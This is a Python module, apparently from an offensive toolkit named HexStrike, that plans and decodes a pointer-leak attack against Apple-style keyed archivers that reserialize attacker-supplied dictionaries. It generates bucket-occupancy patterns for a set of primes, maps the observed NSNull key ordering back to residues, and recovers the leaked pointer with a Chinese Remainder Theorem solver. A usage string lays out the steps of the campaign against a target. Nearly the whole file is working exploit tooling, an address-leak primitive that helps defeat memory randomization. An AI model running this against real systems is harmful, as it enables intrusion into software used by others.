"""Pointer leak payload planning and decoder utilities inspired by Project Zero research.

This module helps HexStrike operators craft pointer-leak experiments against
pointer-keyed data structures that deserialize and reserialize attacker-supplied
content (e.g., NSKeyedArchiver / NSDictionary patterns).  The goal is to supply
reproducible bucket occupancy patterns and decode the returned ordering to
recover pointer hashes via a Chinese Remainder Theorem solver.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

DEFAULT_PRIMES: Tuple[int, ...] = (
    23,
    41,
    71,
    127,
    191,
    251,
    383,
    631,
    1087,
)


@dataclass
class BucketPattern:
    """Describe how to populate a pointer-keyed dictionary for a given prime."""

    prime: int
    pattern: str  # "even" (even buckets occupied) or "odd"
    occupied_buckets: List[int]
    example_keys: List[int]
    insertion_map: Dict[int, int]
    residue_decoder: Dict[str, int]

    def to_dict(self) -> Dict[str, object]:
        return {
            "prime": self.prime,
            "pattern": self.pattern,
            "occupied_buckets": self.occupied_buckets,
            "example_keys": self.example_keys,
            "insertion_map": self.insertion_map,
            "residue_decoder": self.residue_decoder,
        }


def _validate_primes(primes: Sequence[int]) -> List[int]:
    validated: List[int] = []
    for value in primes:
        if not isinstance(value, int) or value <= 2:
            raise ValueError(f"Invalid prime candidate: {value!r}")
        validated.append(value)
    return validated


def _occupied_buckets(prime: int, pattern: str) -> List[int]:
    if pattern not in {"even", "odd"}:
        raise ValueError("pattern must be 'even' or 'odd'")
    offset = 0 if pattern == "even" else 1
    return [idx for idx in range(prime) if idx % 2 == offset]


def _example_keys(prime: int, buckets: Iterable[int]) -> List[int]:
    keys: List[int] = []
    multiplier = 1
    for bucket in buckets:
        keys.append(bucket + prime * multiplier)
        multiplier += 1
    return keys


def _simulate_insertion(prime: int, occupied: Iterable[int], start_bucket: int) -> int:
    occupied_set = set(occupied)
    idx = start_bucket % prime
    while idx in occupied_set:
        idx = (idx + 1) % prime
    return idx


def _build_insertion_map(prime: int, occupied: Iterable[int]) -> Dict[int, int]:
    return {remainder: _simulate_insertion(prime, occupied, remainder) for remainder in range(prime)}


def _build_residue_decoder(
    prime: int,
    even_map: Dict[int, int],
    odd_map: Dict[int, int],
) -> Dict[str, int]:
    decoder: Dict[str, int] = {}
    for remainder in range(prime):
        key = f"{even_map[remainder]}:{odd_map[remainder]}"
        decoder[key] = remainder
    return decoder


def build_pointer_leak_patterns(primes: Optional[Sequence[int]] = None) -> Dict[str, object]:
    """Create bucket population plans and residue decoders for pointer leaks.

    Args:
        primes: optional custom prime table. Defaults to the Project Zero list.

    Returns:
        Dictionary with pattern definitions and decoding helpers.
    """

    primes_list = _validate_primes(primes or DEFAULT_PRIMES)

    patterns: List[BucketPattern] = []
    combined_decoders: Dict[int, Dict[str, int]] = {}

    for prime in primes_list:
        even_buckets = _occupied_buckets(prime, "even")
        odd_buckets = _occupied_buckets(prime, "odd")

        even_map = _build_insertion_map(prime, even_buckets)
        odd_map = _build_insertion_map(prime, odd_buckets)

        decoder = _build_residue_decoder(prime, even_map, odd_map)
        combined_decoders[prime] = decoder

        patterns.append(
            BucketPattern(
                prime=prime,
                pattern="even",
                occupied_buckets=even_buckets,
                example_keys=_example_keys(prime, even_buckets),
                insertion_map=even_map,
                residue_decoder=decoder,
            )
        )
        patterns.append(
            BucketPattern(
                prime=prime,
                pattern="odd",
                occupied_buckets=odd_buckets,
                example_keys=_example_keys(prime, odd_buckets),
                insertion_map=odd_map,
                residue_decoder=decoder,
            )
        )

    modulus_product = 1
    for prime in primes_list:
        modulus_product *= prime

    return {
        "primes": primes_list,
        "patterns": [pattern.to_dict() for pattern in patterns],
        "combined_decoder_keys": {
            prime: sorted(set(decoder.keys())) for prime, decoder in combined_decoders.items()
        },
        "modulus_product": modulus_product,
        "notes": (
            "Populate two NSDictionary instances per prime: one with even buckets occupied "
            "and another with odd buckets occupied. After re-serialization, use the reported "
            "positions of NSNull (or other pointer-key singleton) to map back to residues via "
            "the provided decoders, then feed into chinese_remainder_solver()."
        ),
    }


def chinese_remainder_solver(residue_map: Dict[int, int]) -> Dict[str, object]:
    """Solve for the leaked pointer using CRT on prime/residue pairs."""

    primes = sorted(residue_map.keys())
    if not primes:
        raise ValueError("No modulus values provided")

    modulus_product = 1
    for prime in primes:
        modulus_product *= prime

    result = 0
    crt_steps: List[Dict[str, object]] = []
    for prime in primes:
        residue = residue_map[prime]
        partial_modulus = modulus_product // prime
        inverse = pow(partial_modulus, -1, prime)
        contribution = residue * partial_modulus * inverse
        result = (result + contribution) % modulus_product
        crt_steps.append(
            {
                "prime": prime,
                "residue": residue,
                "partial_modulus": partial_modulus,
                "inverse": inverse,
                "contribution": contribution,
            }
        )

    return {
        "pointer_value": result,
        "pointer_hex": hex(result),
        "modulus_product": modulus_product,
        "steps": crt_steps,
    }


def decode_residues(
    observations: Sequence[Tuple[int, int, int]],
    prime_decoders: Dict[int, Dict[str, int]],
) -> Dict[int, int]:
    """Translate NSNull ordering observations into modulus residues.

    Args:
        observations: iterable of tuples `(prime, even_position, odd_position)`.
        prime_decoders: mapping from prime -> decoder keys produced by
            build_pointer_leak_patterns().

    Returns:
        Dict prime -> residue.
    """

    residues: Dict[int, int] = {}
    for prime, even_pos, odd_pos in observations:
        decoder = prime_decoders.get(prime)
        if not decoder:
            raise KeyError(f"Prime {prime} missing from decoder map")
        key = f"{even_pos}:{odd_pos}"
        if key not in decoder:
            raise KeyError(
                f"Prime {prime} has no decoder entry for even={even_pos}, odd={odd_pos}. "
                "Ensure the observations come from the prescribed bucket layout."
            )
        residues[prime] = decoder[key]
    return residues


def plan_pointer_leak_campaign(primes: Optional[Sequence[int]] = None) -> Dict[str, object]:
    """High-level helper that bundles pattern creation and decoder references."""

    pattern_data = build_pointer_leak_patterns(primes)
    decoder_map = {
        item["prime"]: item["residue_decoder"] for item in pattern_data["patterns"] if item["pattern"] == "even"
    }
    return {
        "primes": pattern_data["primes"],
        "pattern_plan": pattern_data["patterns"],
        "decoder_reference": decoder_map,
        "modulus_product": pattern_data["modulus_product"],
        "usage": (
            "1. For each prime, craft two dictionaries: even buckets occupied and odd buckets occupied.\n"
            "2. Inject NSNull (or target singleton) as the final key during serialization.\n"
            "3. After the target re-serializes data, capture the emitted key ordering.\n"
            "4. For each prime, record the position indexes returned for the even and odd dictionaries.\n"
            "5. Feed (prime, even_pos, odd_pos) tuples into decode_residues() and solve with chinese_remainder_solver()."
        ),
    }


__all__ = [
    "DEFAULT_PRIMES",
    "BucketPattern",
    "build_pointer_leak_patterns",
    "plan_pointer_leak_campaign",
    "decode_residues",
    "chinese_remainder_solver",
]


if __name__ == "__main__":
    import argparse
    import json

    parser = argparse.ArgumentParser(description="Pointer leak planner utilities")
    parser.add_argument("--primes", help="Comma-separated primes", default="")
    parser.add_argument("--crt", help="JSON mapping of prime->residue to solve", default="")
    args = parser.parse_args()

    primes_arg = [int(item) for item in args.primes.split(",") if item.strip()] or None
    if args.crt:
        residue_map = {int(k): int(v) for k, v in json.loads(args.crt).items()}
        solved = chinese_remainder_solver(residue_map)
        print(json.dumps(solved, indent=2))
    else:
        plan = plan_pointer_leak_campaign(primes_arg)
        print(json.dumps(plan, indent=2))
